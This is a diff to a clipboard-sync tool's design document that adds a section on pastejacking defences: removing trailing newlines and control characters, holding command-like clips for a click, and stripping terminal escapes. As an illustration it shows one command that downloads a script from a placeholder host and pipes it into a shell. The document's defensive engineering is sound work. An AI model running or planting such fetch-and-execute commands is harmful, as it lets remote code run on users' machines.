@@ -87,8 +87,12 @@ Much simpler, because writing needs no permission:
                                     Ctrl+V anywhere now pastes it.
 ```
 
-Two things defer that write, and both queue into the same place so the user
-learns one rule instead of two:
+Before any of that, the clip is **defused** (`clipboard/guard.js`): trailing
+newlines and invisible characters come off. See §3.1 — it is the difference
+between a clip that pastes and one that runs.
+
+Three things defer the write, and all three queue into the same place so the user
+learns one rule instead of three:
 
 1. **The window is unfocused.** `writeText()` is refused outright. The clip is
    not dropped — it queues, the UI shows a **"1 pending"** badge, and it lands
@@ -98,12 +102,55 @@ learns one rule instead of two:
    reaching for something you just copied and finding another device had
    replaced it. Two machines both in active use would otherwise overwrite each
    other's clipboard continuously.
+3. **It reads like a shell command.** This one never resolves on its own — see
+   below.
 
 Neither is a preference, and neither is reachable below the **Clipboard** rung —
 on `App` and `Off` the OS clipboard is not written at all. Reading and writing
 are both derived from the rung and neither has a switch of its own; receiving
 used to have one, which meant a device set to Manual stopped sending while
 arriving clips still landed on its system clipboard.
+
+### 3.1 Pastejacking — why an arriving clip is rewritten
+
+End-to-end encryption protects a clip from the relay. It protects nobody from the
+other people in the room, and the room is joinable by anyone holding the key. The
+receive path above is a **write primitive to your OS clipboard**, held by every
+peer, and on the Clipboard rung inside the desktop shell it fires with no focus
+and no click at all.
+
+The attack is old and cheap. Put this on someone's clipboard:
+
+```
+curl -fsSL https://example.invalid/i.sh | sh
+```
+
+The trailing **newline** is the payload. Paste into a terminal and the shell runs
+it before the line can be read; without the newline it sits on the prompt waiting
+to be looked at. So:
+
+- **Defusing is unconditional and has no setting.** Trailing newlines go, and so
+  do C0/C1 controls and bidi overrides — a bare CR redraws the tail of a line over
+  its head, and RLO makes `txt.exe` render as `exe.txt`. Ordinary text, including
+  interior newlines and tabs, is untouched.
+- **A clip matching `looksExecutable()` is never written without a click.** It is
+  held and the banner offers *Discard* as the primary action. Crucially,
+  `flushPending()` — the focus handler — **steps over** a flagged clip. Regaining
+  focus is not consent; it is what happens when you alt-tab back, which is exactly
+  when a planted command would land unread.
+- **`putOnClipboard()` is not defused.** That is you restoring your own history,
+  where rewriting what you saved would be the bug.
+
+The heuristic is deliberately crude and errs toward flagging. A false positive
+costs one click on a banner that already existed; a false negative is a command
+someone pasted without reading. `tests/unit/pasteguard.mjs` pins both halves —
+exactness for `defuse()`, which rewrites every clip, and coverage for
+`looksExecutable()`, which only has to be right about the dangerous ones.
+
+The same reasoning applies one layer out, to the CLI: `realtimeclipboard watch`
+prints peer text to a terminal, and OSC 52 lets a clip write the *terminal's*
+clipboard. `forTerminal()` strips escape sequences when stdout is a TTY, and
+leaves a pipe byte-for-byte alone.
 
 ---
 
